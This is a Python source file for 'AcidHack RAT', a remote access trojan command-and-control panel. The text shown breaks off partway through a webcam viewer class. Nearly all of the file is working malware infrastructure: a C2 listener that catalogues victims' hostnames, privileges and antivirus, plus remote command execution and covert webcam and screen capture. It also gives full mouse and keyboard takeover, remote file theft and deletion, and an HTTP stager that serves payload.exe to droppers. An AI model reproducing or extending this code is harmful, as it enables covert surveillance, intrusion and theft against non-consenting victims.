#!/usr/bin/env python3
"""
AcidHack RAT - Command & Control Server Panel v3.0
Red/Black Theme - Modern - Fixed Persistence & Process Hiding
"""

import sys
import os
import socket
import threading
import json
import time
import subprocess
import base64
import shutil
import http.server
import socketserver
from datetime import datetime
from PyQt5.QtCore import pyqtSignal  # Add this if not already present

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QTableWidget, QTableWidgetItem, QHeaderView,
    QTabWidget, QTextEdit, QLineEdit, QLabel, QSplitter,
    QTreeWidget, QTreeWidgetItem, QMessageBox, QInputDialog,
    QFileDialog, QGroupBox, QGridLayout,
    QProgressBar, QDialog, QFormLayout, QSpinBox,
    QComboBox, QCheckBox, QMenu, QAction,
    QSlider, QFrame, QScrollArea, QAbstractItemView, QSizePolicy
)
from PyQt5.QtCore import (
    Qt, QThread, pyqtSignal, QTimer, QSize, QByteArray, QBuffer,
    QIODevice
)
from PyQt5.QtGui import (
    QFont, QColor, QPalette, QIcon, QPixmap, QImage,
    QTextCursor, QBrush, QPainter, QPen
)

# ============================================================
# RED/BLACK THEME - MODERN, READABLE, SLEEK
# ============================================================
RED_BLACK_STYLE = """
/* MAIN BACKGROUND - Deep Black with red accents */
QMainWindow, QDialog, QWidget {
    background-color: #0a0a0a;
    color: #ff3333;
    font-family: 'Segoe UI', 'Cascadia Code', 'Consolas', monospace;
}

/* ===== HEADERS & TITLE LABELS ===== */
QLabel {
    color: #ff4444;
    font-size: 13px;
}
QLabel#header_label {
    font-size: 22px;
    font-weight: 800;
    color: #ff3333;
    background-color: #0d0d0d;
    border: 2px solid #cc0000;
    padding: 14px;
    border-radius: 6px;
    letter-spacing: 2px;
}

/* ===== TABLES - Clean, readable ===== */
QTableWidget {
    background-color: #0d0d0d;
    color: #ffffff;
    gridline-color: #2a0000;
    border: 1px solid #330000;
    selection-background-color: #4a0000;
    selection-color: #ff6666;
    font-size: 12px;
    outline: none;
}
QTableWidget::item {
    padding: 8px;
    border-bottom: 1px solid #1a0000;
}
QTableWidget::item:selected {
    background-color: #4a0000;
    color: #ff6666;
}
QTableWidget::item:hover {
    background-color: #1a0000;
}
QHeaderView::section {
    background-color: #111111;
    color: #ff4444;
    border: 1px solid #330000;
    padding: 8px 12px;
    font-weight: 700;
    text-transform: uppercase;
    font-size: 11px;
}

/* ===== BUTTONS - Red on dark, modern ===== */
QPushButton {
    background-color: #1a0000;
    color: #ff4444;
    border: 1px solid #cc0000;
    padding: 8px 18px;
    border-radius: 4px;
    font-size: 12px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}
QPushButton:hover {
    background-color: #cc0000;
    color: #ffffff;
    border: 1px solid #ff3333;
}
QPushButton:pressed {
    background-color: #990000;
    color: #ffffff;
}
QPushButton:disabled {
    background-color: #0d0d0d;
    color: #333333;
    border: 1px solid #1a1a1a;
}

/* ===== TABS ===== */
QTabWidget::pane {
    background-color: #0d0d0d;
    border: 1px solid #330000;
    border-top: 2px solid #cc0000;
}
QTabBar::tab {
    background-color: #111111;
    color: #ff3333;
    border: 1px solid #2a0000;
    border-bottom: none;
    padding: 10px 18px;
    margin-right: 2px;
    font-weight: 600;
    font-size: 11px;
    text-transform: uppercase;
    min-width: 80px;
}
QTabBar::tab:selected {
    background-color: #1a0000;
    border-bottom: 2px solid #ff3333;
    color: #ff6666;
}
QTabBar::tab:hover {
    background-color: #220000;
}

/* ===== TEXT INPUTS ===== */
QTextEdit, QLineEdit {
    background-color: #0a0a0a;
    color: #ffffff;
    border: 1px solid #330000;
    padding: 8px;
    font-size: 13px;
    selection-background-color: #cc0000;
    selection-color: #ffffff;
}
QTextEdit:focus, QLineEdit:focus {
    border: 1px solid #ff3333;
    background-color: #0d0d0d;
}
QTextEdit:disabled, QLineEdit:disabled {
    background-color: #080808;
    color: #444444;
}

/* ===== GROUP BOX ===== */
QGroupBox {
    border: 1px solid #330000;
    border-radius: 6px;
    margin-top: 14px;
    padding-top: 18px;
    font-weight: 700;
    color: #ff4444;
    font-size: 13px;
}
QGroupBox::title {
    subcontrol-origin: margin;
    left: 12px;
    padding: 0 8px;
}

/* ===== TREE WIDGET ===== */
QTreeWidget {
    background-color: #0d0d0d;
    color: #ffffff;
    border: 1px solid #330000;
    font-size: 12px;
    alternate-background-color: #0a0a0a;
}
QTreeWidget::item {
    padding: 4px;
}
QTreeWidget::item:selected {
    background-color: #4a0000;
    color: #ff6666;
}

/* ===== PROGRESS BAR ===== */
QProgressBar {
    border: 1px solid #330000;
    background-color: #0d0d0d;
    text-align: center;
    color: #ffffff;
    font-weight: bold;
    border-radius: 3px;
}
QProgressBar::chunk {
    background-color: #cc0000;
    width: 10px;
}

/* ===== CHECKBOX ===== */
QCheckBox {
    color: #ff4444;
    spacing: 10px;
    font-size: 12px;
}
QCheckBox::indicator {
    width: 18px;
    height: 18px;
    border: 2px solid #cc0000;
    background-color: #0d0d0d;
    border-radius: 3px;
}
QCheckBox::indicator:checked {
    background-color: #cc0000;
}
QCheckBox::indicator:hover {
    border: 2px solid #ff3333;
}

/* ===== COMBO BOX ===== */
QComboBox {
    background-color: #0d0d0d;
    color: #ffffff;
    border: 1px solid #330000;
    padding: 6px 12px;
    border-radius: 3px;
}
QComboBox::drop-down {
    border: none;
    width: 24px;
}
QComboBox::down-arrow {
    image: none;
    border-left: 4px solid transparent;
    border-right: 4px solid transparent;
    border-top: 6px solid #ff4444;
    margin-right: 6px;
}
QComboBox QAbstractItemView {
    background-color: #0d0d0d;
    color: #ffffff;
    selection-background-color: #4a0000;
    selection-color: #ff6666;
    border: 1px solid #330000;
}

/* ===== SCROLL BARS ===== */
QScrollBar:vertical {
    background: #0a0a0a;
    width: 10px;
    border: none;
}
QScrollBar::handle:vertical {
    background: #2a0000;
    min-height: 24px;
    border-radius: 5px;
}
QScrollBar::handle:vertical:hover {
    background: #cc0000;
}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
    height: 0px;
}
QScrollBar:horizontal {
    background: #0a0a0a;
    height: 10px;
}
QScrollBar::handle:horizontal {
    background: #2a0000;
    min-width: 24px;
    border-radius: 5px;
}
QScrollBar::handle:horizontal:hover {
    background: #cc0000;
}

/* ===== MENU ===== */
QMenu {
    background-color: #0d0d0d;
    color: #ffffff;
    border: 1px solid #330000;
    padding: 4px;
}
QMenu::item {
    padding: 8px 32px 8px 16px;
    border-radius: 3px;
}
QMenu::item:selected {
    background-color: #4a0000;
    color: #ff6666;
}
QMenu::separator {
    height: 1px;
    background: #330000;
    margin: 4px 8px;
}

/* ===== STATUS BAR ===== */
QStatusBar {
    background-color: #0d0d0d;
    color: #ff4444;
    border-top: 1px solid #330000;
    font-size: 12px;
}

/* ===== DANGER BUTTONS ===== */
QPushButton#danger_btn {
    background-color: #2a0000;
    color: #ff4444;
    border: 2px solid #ff4444;
    font-weight: bold;
}
QPushButton#danger_btn:hover {
    background-color: #cc0000;
    color: #ffffff;
}
QPushButton#danger_btn:pressed {
    background-color: #990000;
}
"""


# ============================================================
# GLOBALS
# ============================================================
HOST = "0.0.0.0"
PORT = 4443
BUFFER = 65536
clients = {}
clients_lock = threading.Lock()


# ============================================================
# SCREENSHOT VIEWER
# ============================================================
class ScreenshotViewer(QDialog):
    def __init__(self, client_id, parent=None):
        super().__init__(parent)
        self.client_id = client_id
        self.setWindowTitle(f"AcidHack - Screenshot [{client_id}]")
        self.setGeometry(100, 100, 1200, 800)
        self.setStyleSheet(RED_BLACK_STYLE)

        layout = QVBoxLayout()
        self.image_label = QLabel("Waiting for screenshot...")
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: #000; color: #555; font-size: 14px; border: 1px solid #330000; border-radius: 4px;")
        layout.addWidget(self.image_label, 1)

        btn_layout = QHBoxLayout()
        self.btn_save = QPushButton("Save As...")
        self.btn_save.clicked.connect(self.save_image)
        self.btn_refresh = QPushButton("Take Another")
        self.btn_refresh.clicked.connect(self.request_screenshot)
        btn_layout.addStretch()
        btn_layout.addWidget(self.btn_refresh)
        btn_layout.addWidget(self.btn_save)
        layout.addLayout(btn_layout)

        self.setLayout(layout)
        self.current_pixmap = None

    def display_screenshot(self, pixmap):
        self.current_pixmap = pixmap
        scaled = pixmap.scaled(self.image_label.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
        self.image_label.setPixmap(scaled)
        self.setWindowTitle(f"AcidHack - Screenshot [{self.client_id}] ({pixmap.width()}x{pixmap.height()})")

    def request_screenshot(self):
        self.image_label.setText("Requesting screenshot...")
        self.parent().request_screenshot_for_client(self.client_id)

    def save_image(self):
        if self.current_pixmap:
            path, _ = QFileDialog.getSaveFileName(self, "Save Screenshot",
                                                   f"screenshot_{self.client_id}_{int(time.time())}.png",
                                                   "PNG Images (*.png)")
            if path:
                self.current_pixmap.save(path, "PNG")
                QMessageBox.information(self, "Saved", f"Screenshot saved to:\n{path}")

    def closeEvent(self, event):
        try:
            p = self.parent()
            if p and hasattr(p, 'screenshot_viewers') and self.client_id in p.screenshot_viewers:
                del p.screenshot_viewers[self.client_id]
        except:
            pass
        event.accept()


# ============================================================
# SCREEN SHARE / REMOTE CONTROL DIALOG
# ============================================================
class ScreenShareDisplay(QWidget):
    """Custom widget that captures mouse and keyboard events for remote control."""
    
    mouse_event_signal = pyqtSignal(str, str, int, int)  # (event, button, x, y)
    keyboard_event_signal = pyqtSignal(str, str)         # (event, key)
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMouseTracking(True)
        self.setFocusPolicy(Qt.StrongFocus)
        self.setCursor(Qt.CrossCursor)
        self.pixmap = None
        self.display_width = 0
        self.display_height = 0
        self.control_enabled = True
        
    def set_control_enabled(self, enabled):
        self.control_enabled = enabled
        self.setCursor(Qt.CrossCursor if enabled else Qt.ArrowCursor)
        if enabled:
            self.setFocusPolicy(Qt.StrongFocus)
        else:
            self.setFocusPolicy(Qt.NoFocus)
    
    def set_pixmap(self, pixmap):
        self.pixmap = pixmap
        self.display_width = pixmap.width()
        self.display_height = pixmap.height()
        self.update()
    
    def paintEvent(self, event):
        if self.pixmap:
            painter = QPainter(self)
            scaled = self.pixmap.scaled(self.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation)
            x = (self.width() - scaled.width()) // 2
            y = (self.height() - scaled.height()) // 2
            painter.drawPixmap(x, y, scaled)
            painter.end()
        else:
            super().paintEvent(event)
    
    def _get_remote_coords(self, pos):
        """Map widget coordinates to remote screen coordinates."""
        if self.display_width == 0 or self.display_height == 0:
            return 0, 0
        
        label_w = self.width()
        label_h = self.height()
        scale = min(label_w / self.display_width, label_h / self.display_height)
        disp_w = int(self.display_width * scale)
        disp_h = int(self.display_height * scale)
        offset_x = (label_w - disp_w) // 2
        offset_y = (label_h - disp_h) // 2
        
        rel_x = pos.x() - offset_x
        rel_y = pos.y() - offset_y
        
        remote_x = max(0, min(self.display_width - 1, int(rel_x / scale)))
        remote_y = max(0, min(self.display_height - 1, int(rel_y / scale)))
        return remote_x, remote_y
    
    def mousePressEvent(self, event):
        if not self.control_enabled:
            super().mousePressEvent(event)
            return
        x, y = self._get_remote_coords(event.pos())
        btn = event.button()
        if btn == Qt.LeftButton:
            self.mouse_event_signal.emit("click", "left", x, y)
        elif btn == Qt.RightButton:
            self.mouse_event_signal.emit("click", "right", x, y)
        elif btn == Qt.MidButton:
            self.mouse_event_signal.emit("click", "middle", x, y)
        self.setFocus()
        event.accept()
    
    def mouseReleaseEvent(self, event):
        if not self.control_enabled:
            super().mouseReleaseEvent(event)
            return
        x, y = self._get_remote_coords(event.pos())
        btn = event.button()
        bname = "left"
        if btn == Qt.RightButton:
            bname = "right"
        elif btn == Qt.MidButton:
            bname = "middle"
        self.mouse_event_signal.emit("release", bname, x, y)
        event.accept()
    
    def mouseDoubleClickEvent(self, event):
        if not self.control_enabled:
            super().mouseDoubleClickEvent(event)
            return
        x, y = self._get_remote_coords(event.pos())
        btn = event.button()
        bname = "left"
        if btn == Qt.RightButton:
            bname = "right"
        self.mouse_event_signal.emit("dblclick", bname, x, y)
        event.accept()
    
    def mouseMoveEvent(self, event):
        if not self.control_enabled:
            super().mouseMoveEvent(event)
            return
        x, y = self._get_remote_coords(event.pos())
        self.mouse_event_signal.emit("move", "", x, y)
        # Don't accept — allow the event to propagate for cursor updates
        event.ignore()
    
    def keyPressEvent(self, event):
        if not self.control_enabled:
            super().keyPressEvent(event)
            return
        
        key_text = event.text()
        key_code = event.key()
        
        # Map Qt keys to pyautogui key names
        key_map = {
            Qt.Key_Return: "enter", Qt.Key_Enter: "enter",
            Qt.Key_Escape: "esc",
            Qt.Key_Tab: "tab",
            Qt.Key_Backspace: "backspace",
            Qt.Key_Delete: "delete",
            Qt.Key_Home: "home", Qt.Key_End: "end",
            Qt.Key_PageUp: "pageup", Qt.Key_PageDown: "pagedown",
            Qt.Key_Up: "up", Qt.Key_Down: "down", Qt.Key_Left: "left", Qt.Key_Right: "right",
            Qt.Key_F1: "f1", Qt.Key_F2: "f2", Qt.Key_F3: "f3", Qt.Key_F4: "f4",
            Qt.Key_F5: "f5", Qt.Key_F6: "f6", Qt.Key_F7: "f7", Qt.Key_F8: "f8",
            Qt.Key_F9: "f9", Qt.Key_F10: "f10", Qt.Key_F11: "f11", Qt.Key_F12: "f12",
            Qt.Key_Space: "space",
            Qt.Key_Shift: "shift", Qt.Key_Control: "ctrl", Qt.Key_Alt: "alt",
            Qt.Key_Meta: "win",
            Qt.Key_CapsLock: "capslock",
            Qt.Key_Insert: "insert",
            Qt.Key_Print: "printscreen",
            Qt.Key_Pause: "pause",
        }
        
        if key_code in key_map:
            self.keyboard_event_signal.emit("keydown", key_map[key_code])
        elif key_text and key_text.isprintable():
            self.keyboard_event_signal.emit("keydown", key_text)
        
        event.accept()


class ScreenShareDialog(QDialog):
    """Live screen view with remote mouse/keyboard control — FIXED."""
    def __init__(self, client_id, send_cmd_func, parent=None):
        super().__init__(parent)
        self.client_id = client_id
        self.send_cmd = send_cmd_func
        self.running = False
        self.view_only = False
        self.setWindowTitle(f"AcidHack - Screen Share & Control [{client_id}]")
        self.setGeometry(50, 50, 1280, 900)
        self.setStyleSheet(RED_BLACK_STYLE)
        self.setAttribute(Qt.WA_DeleteOnClose, False)

        layout = QVBoxLayout()

        # Control bar
        ctrl_layout = QHBoxLayout()
        self.btn_start = QPushButton("START SCREEN SHARE")
        self.btn_start.clicked.connect(self.start_screenshare)
        self.btn_stop = QPushButton("STOP")
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(self.stop_screenshare)
        self.lbl_fps = QLabel("FPS: 0")
        self.lbl_fps.setStyleSheet("color: #ff4444; font-weight: bold;")
        self.lbl_res = QLabel("Resolution: --")
        self.lbl_res.setStyleSheet("color: #ffffff;")

        ctrl_layout.addWidget(self.btn_start)
        ctrl_layout.addWidget(self.btn_stop)
        ctrl_layout.addStretch()
        ctrl_layout.addWidget(self.lbl_res)
        ctrl_layout.addWidget(self.lbl_fps)
        layout.addLayout(ctrl_layout)

        # Main display area — CUSTOM WIDGET, not QLabel
        self.display = ScreenShareDisplay()
        self.display.setMinimumSize(800, 600)
        self.display.setStyleSheet("background-color: #000000; border: 1px solid #330000; border-radius: 4px;")
        
        # Connect signals from the display widget to our send functions
        self.display.mouse_event_signal.connect(self.on_mouse_event)
        self.display.keyboard_event_signal.connect(self.on_keyboard_event)
        
        layout.addWidget(self.display, 1)

        # Remote Control section
        control_group = QGroupBox("Remote Control")
        control_layout = QVBoxLayout()

        # Row 1: View Only + Mouse/Keyboard toggles
        row1 = QHBoxLayout()
        self.chk_view_only = QCheckBox("VIEW ONLY MODE (watch only, no control)")
        self.chk_view_only.setChecked(False)
        self.chk_view_only.setStyleSheet("color: #ffaa00; font-weight: bold; font-size: 12px;")
        self.chk_view_only.toggled.connect(self.on_view_only_toggled)
        self.chk_mouse = QCheckBox("Mouse Control")
        self.chk_mouse.setChecked(True)
        self.chk_mouse.setStyleSheet("color: #ff4444; font-weight: bold;")
        self.chk_keyboard = QCheckBox("Keyboard Control")
        self.chk_keyboard.setChecked(True)
        self.chk_keyboard.setStyleSheet("color: #ff4444; font-weight: bold;")
        row1.addWidget(self.chk_view_only)
        row1.addStretch()
        row1.addWidget(self.chk_mouse)
        row1.addWidget(self.chk_keyboard)
        control_layout.addLayout(row1)

        # Row 2: Special keys
        row2 = QHBoxLayout()
        self.btn_send_ctrl_alt_del = QPushButton("Send Ctrl+Alt+Del")
        self.btn_send_ctrl_alt_del.clicked.connect(lambda: self.send_keys("ctrl+alt+del"))
        self.btn_win_r = QPushButton("Send Win+R")
        self.btn_win_r.clicked.connect(lambda: self.send_keys("win+r"))
        self.btn_esc = QPushButton("Send ESC")
        self.btn_esc.clicked.connect(lambda: self.send_keys("esc"))
        self.btn_enter = QPushButton("Send Enter")
        self.btn_enter.clicked.connect(lambda: self.send_keys("enter"))
        row2.addWidget(self.btn_send_ctrl_alt_del)
        row2.addWidget(self.btn_win_r)
        row2.addWidget(self.btn_esc)
        row2.addWidget(self.btn_enter)
        row2.addStretch()
        control_layout.addLayout(row2)
        
        # Info label
        self.lbl_control_status = QLabel("Control: ENABLED — Click on the remote screen to interact")
        self.lbl_control_status.setStyleSheet("color: #44ff44; font-weight: bold; font-size: 12px; padding: 4px;")
        control_layout.addWidget(self.lbl_control_status)

        control_group.setLayout(control_layout)
        layout.addWidget(control_group)

        self.setLayout(layout)

        self.frame_count = 0
        self.fps_timer = QTimer()
        self.fps_timer.timeout.connect(self.update_fps)
        self.fps_timer.start(1000)

    def on_mouse_event(self, event, button, x, y):
        """Called when the display widget captures a mouse event."""
        if self.running and not self.view_only and self.chk_mouse.isChecked():
            if event == "move" and not button:
                self.send_cmd("mouse_event", event="move", x=x, y=y)
            else:
                self.send_cmd("mouse_event", event=event, button=button or "left", x=x, y=y)

    def on_keyboard_event(self, event, key):
        """Called when the display widget captures a keyboard event."""
        if self.running and not self.view_only and self.chk_keyboard.isChecked():
            self.send_cmd("keyboard_event", event=event, key=key)

    def on_view_only_toggled(self, checked):
        self.view_only = checked
        self.chk_mouse.setEnabled(not checked)
        self.chk_keyboard.setEnabled(not checked)
        self.btn_send_ctrl_alt_del.setEnabled(not checked)
        self.btn_win_r.setEnabled(not checked)
        self.btn_esc.setEnabled(not checked)
        self.btn_enter.setEnabled(not checked)
        self.display.set_control_enabled(not checked)
        if checked:
            self.lbl_control_status.setText("Control: DISABLED (View Only)")
            self.lbl_control_status.setStyleSheet("color: #ffaa00; font-weight: bold;")
        else:
            self.lbl_control_status.setText("Control: ENABLED — Click on the remote screen to interact")
            self.lbl_control_status.setStyleSheet("color: #44ff44; font-weight: bold;")

    def log_message(self, msg):
        if self.parent():
            try:
                self.parent().log_message(msg)
            except:
                pass

    def start_screenshare(self):
        self.running = True
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.display.setFocus()  # Grab focus for keyboard
        self.send_cmd("screenshare_start", quality=40, fps=10)

    def stop_screenshare(self):
        self.running = False
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.send_cmd("screenshare_stop")

    def update_frame(self, jpeg_data):
        if not self.running:
            return
        pixmap = QPixmap()
        if pixmap.loadFromData(jpeg_data, "JPEG"):
            self.display.set_pixmap(pixmap)
            self.frame_count += 1
            self.lbl_res.setText(f"Resolution: {pixmap.width()}x{pixmap.height()}")

    def update_fps(self):
        self.lbl_fps.setText(f"FPS: {self.frame_count}")
        self.frame_count = 0

    def send_keys(self, combo):
        if self.running and not self.view_only:
            self.send_cmd("keyboard_event", event="combo", key=combo)

    def closeEvent(self, event):
        if self.running:
            self.stop_screenshare()
        try:
            p = self.parent()
            if p and hasattr(p, 'screenshare_dialogs') and self.client_id in p.screenshare_dialogs:
                del p.screenshare_dialogs[self.client_id]
        except:
            pass
        event.accept()


# ============================================================
# SOCKET THREADS
# ============================================================
class ClientHandler(QThread):
    log_signal = pyqtSignal(str)
    client_update_signal = pyqtSignal(dict)
    client_disconnected_signal = pyqtSignal(str)
    webcam_frame_signal = pyqtSignal(bytes)
    screenshare_frame_signal = pyqtSignal(bytes)
    file_list_signal = pyqtSignal(str, str, list)
    chat_message_signal = pyqtSignal(str, str)
    cmd_output_signal = pyqtSignal(str, str)
    file_transfer_progress = pyqtSignal(str, int, int)
    screenshot_data_signal = pyqtSignal(str, bytes)
    file_download_data_signal = pyqtSignal(str, str, str, str)

    def __init__(self, client_socket, addr, client_id):
        super().__init__()
        self.sock = client_socket
        self.addr = addr
        self.client_id = client_id
        self.running = True
        self.buffer = BUFFER
        self.buf = ""

    def run(self):
        self.log_signal.emit(f"[+] Client {self.client_id} connected from {self.addr[0]}:{self.addr[1]}")
        try:
            self.sock.send(json.dumps({"type": "handshake", "client_id": self.client_id}).encode() + b"\n")
        except:
            self.running = False
            return

        while self.running:
            try:
                data = self.sock.recv(self.buffer)
                if not data:
                    break
                self.process_data(data)
            except socket.timeout:
                continue
            except:
                break

        self.disconnect()

    def process_data(self, data):
        self.buf += data.decode('utf-8', errors='ignore')
        while '\n' in self.buf:
            line, self.buf = self.buf.split('\n', 1)
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
                self.handle_message(msg)
            except json.JSONDecodeError:
                pass

    def handle_message(self, msg):
        msg_type = msg.get("type", "")

        if msg_type == "info":
            self.client_update_signal.emit({
                "id": self.client_id,
                "hostname": msg.get("hostname", "Unknown"),
                "username": msg.get("username", "Unknown"),
                "os": msg.get("os", "Unknown"),
                "ip": self.addr[0],
                "port": self.addr[1],
                "privilege": msg.get("privilege", "User"),
                "antivirus": msg.get("antivirus", "Unknown"),
                "uptime": msg.get("uptime", "0"),
                "cpu": msg.get("cpu", "N/A"),
                "ram": msg.get("ram", "N/A"),
                "last_seen": datetime.now().strftime("%H:%M:%S")
            })

        elif msg_type == "cmd_output":
            self.cmd_output_signal.emit(self.client_id, msg.get("output", ""))

        elif msg_type == "webcam_frame":
            try:
                frame_data = base64.b64decode(msg.get("frame", ""))
                self.webcam_frame_signal.emit(frame_data)
            except:
                pass

        elif msg_type == "screenshare_frame":
            try:
                frame_data = base64.b64decode(msg.get("frame", ""))
                self.log_signal.emit(f"[DBG] Screenshare frame: {len(frame_data)} bytes")
                self.screenshare_frame_signal.emit(frame_data)
            except Exception as e:
                self.log_signal.emit(f"[!] Screenshare frame error: {e}")

        elif msg_type == "screenshot_data":
            try:
                img_data = base64.b64decode(msg.get("data", ""))
                self.screenshot_data_signal.emit(self.client_id, img_data)
            except Exception as e:
                self.log_signal.emit(f"[!] Screenshot decode error: {e}")

        elif msg_type == "file_list":
            path = msg.get("path", "/")
            files = msg.get("files", [])
            self.file_list_signal.emit(self.client_id, path, files)

        elif msg_type == "file_data":
            filename = msg.get("filename", "unknown")
            data_b64 = msg.get("data", "")
            self.file_download_data_signal.emit(self.client_id, filename, data_b64, "")

        elif msg_type == "chat":
            message = msg.get("message", "")
            sender = msg.get("sender", "target")
            self.chat_message_signal.emit(self.client_id, json.dumps({"message": message, "sender": sender}))

        elif msg_type == "file_transfer_progress":
            filename = msg.get("filename", "")
            sent = msg.get("sent", 0)
            total = msg.get("total", 0)
            self.file_transfer_progress.emit(filename, sent, total)

        elif msg_type == "pong":
            pass

        elif msg_type == "upload_complete":
            self.log_signal.emit(f"[+] Upload complete on {self.client_id}: {msg.get('path','')}")

        elif msg_type == "delete_complete":
            self.log_signal.emit(f"[+] Deleted on {self.client_id}: {msg.get('path','')}")

        elif msg_type == "file_error":
            self.log_signal.emit(f"[!] File error on {self.client_id}: {msg.get('error','')}")

        elif msg_type == "screenshare_stopped":
            self.log_signal.emit(f"[i] Screen share stream ended on {self.client_id}")

    def send_command(self, command_type, **kwargs):
        try:
            payload = {"type": command_type, **kwargs}
            data = json.dumps(payload).encode() + b"\n"
            self.sock.send(data)
            return True
        except:
            return False

    def disconnect(self):
        self.running = False
        self.client_disconnected_signal.emit(self.client_id)
        try:
            self.sock.close()
        except:
            pass
        self.log_signal.emit(f"[-] Client {self.client_id} disconnected")


class ServerListener(QThread):
    new_client_signal = pyqtSignal(object, tuple, str)
    
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.http_port = port + 1
        self.running = True
        self.server_sock = None
        self.http_server = None
        self.payload_paths = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.exe"),
            os.path.join(os.getcwd(), "payload.exe"),
        ]
        self.payload_data = None
        self.payload_path = 'payload.exe'
        self._load_payload()
    
    def _load_payload(self):                           # <-- 4 spaces indent
        """Load payload.exe into memory."""
        self.payload_paths = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.exe"),
            os.path.join(os.getcwd(), "payload.exe"),
        ]
        for p in self.payload_paths:                   # <-- 8 spaces
            if os.path.exists(p):
                with open(p, "rb") as f:
                    self.payload_data = f.read()
                self.payload_path = p
                print(f"[*] Payload loaded: {len(self.payload_data)} bytes from {p}")
                return True
        print("[!] No payload.exe found")
        return False
    
    def run(self):                                     # <-- 4 spaces
        # Main C2 listener on self.port (4443)
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(100)
        self.server_sock.settimeout(1.0)
        
        print(f"[*] C2 listening on {self.host}:{self.port}")
        
        http_thread = threading.Thread(target=self._run_http_server, daemon=True)
        http_thread.start()
        
        while self.running:
            try:
                client_sock, addr = self.server_sock.accept()
                client_sock.settimeout(30.0)
                client_id = f"ACID-{int(time.time() * 1000) % 100000:05d}"
                self.new_client_signal.emit(client_sock, addr, client_id)
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[!] Listener error: {e}")
                break
    
    def _run_http_server(self):
        """Simple HTTP server on port+1 to serve payload to stagers."""
        http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        http_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            http_sock.bind((self.host, self.http_port))
            http_sock.listen(10)
            http_sock.settimeout(1.0)
            print(f"[*] HTTP stager server listening on {self.host}:{self.http_port}")
        except Exception as e:
            print(f"[!] Could not bind HTTP port {self.http_port}: {e}")
            return
        
        while self.running:
            try:
                client, addr = http_sock.accept()
                print(f"[*] HTTP stager connection from {addr[0]}:{addr[1]}")
                # Handle each connection in its own thread so we don't block
                threading.Thread(target=self._handle_http_stager, args=(client,), daemon=True).start()
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[!] HTTP server error: {e}")
                continue

    def _handle_http_stager(self, client_socket):
        """Handle an incoming HTTP request from a stager and serve the payload."""
        try:
            client_socket.settimeout(30)
            
            # Read the full HTTP request
            request_data = b""
            while True:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    request_data += chunk
                    # Stop reading once we have the full headers (double CRLF)
                    if b"\r\n\r\n" in request_data or b"\n\n" in request_data:
                        break
                except socket.timeout:
                    break
            
            print(f"[*] Stager HTTP request: {len(request_data)} bytes")
            request_text = request_data.decode(errors='replace')
            
            if 'GET' in request_text and ('payload.exe' in request_text or 'payload' in request_text.lower()):
                # Find the payload file
                search_paths = [
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.exe"),
                    os.path.join(os.getcwd(), "payload.exe"),
                    "payload.exe",
                    os.path.expanduser("~/payload.exe"),
                ]
                
                payload_exe_path = None
                for p in search_paths:
                    if os.path.exists(p):
                        payload_exe_path = p
                        break
                
                if payload_exe_path and os.path.exists(payload_exe_path):
                    with open(payload_exe_path, 'rb') as f:
                        payload_data = f.read()
                    
                    # Send as raw binary with HTTP headers
                    headers = (
                        "HTTP/1.0 200 OK\r\n"
                        f"Content-Length: {len(payload_data)}\r\n"
                        "Content-Type: application/octet-stream\r\n"
                        "Connection: close\r\n"
                        "\r\n"
                    ).encode()
                    
                    # Send headers + body in one send if possible
                    client_socket.sendall(headers + payload_data)
                    
                    print(f"[+] Payload served: {len(payload_data)} bytes from {payload_exe_path}")
                else:
                    response = (
                        "HTTP/1.0 404 Not Found\r\n"
                        "Content-Length: 0\r\n"
                        "Connection: close\r\n"
                        "\r\n"
                    ).encode()
                    client_socket.sendall(response)
                    print(f"[!] Payload not found - searched: {search_paths}")
            else:
                response = (
                    "HTTP/1.0 404 Not Found\r\n"
                    "Content-Length: 0\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                ).encode()
                client_socket.sendall(response)

        except Exception as e:
            print(f"[!] Error handling stager HTTP request: {e}")
            import traceback
            traceback.print_exc()
        finally:
            try:
                client_socket.close()
            except:
                pass

# ============================================================
# WEBCAM VIEWER DIALOG
# ============================================================
class WebcamViewer(QDialog):
    closed = pyqtSignal(str)

    def __init__(self, client_id, parent=None):
        super().__init__(parent)
        self.client_id = client_id
        self.setWindowTitle(f"AcidHack - Webcam Stream [{client_id}]")
        self.setGeometry(200, 200, 800, 600)
        self.setStyleSheet(RED_BLACK_STYLE)
        # REMOVED: self.setWindowFlags(Qt.WindowStaysOnTopHint) — this was blocking close

        layout = QVBoxLayout()
        self.label = QLabel("Waiting for webcam stream...")
        self.label.setAlignment(Qt.AlignCenter)
        self.label.setStyleSheet("background-color: #000; color: #ff4444; font-size: 16px; border: 1px solid #330000;")
        layout.addWidget(self.label)

        btn_layout = QHBoxLayout()
        self.btn_start = QPushButton("Start Stream")
        self.btn_stop = QPushButton("Stop Stream")
        self.btn_stop.setEnabled(False)
        
        # Connect buttons to actual functions
        self.btn_start.clicked.connect(self.start_stream)
        self.btn_stop.clicked.connect(self.stop_stream)
        
        btn_layout.addWidget(self.btn_start)
        btn_layout.addWidget(self.btn_stop)
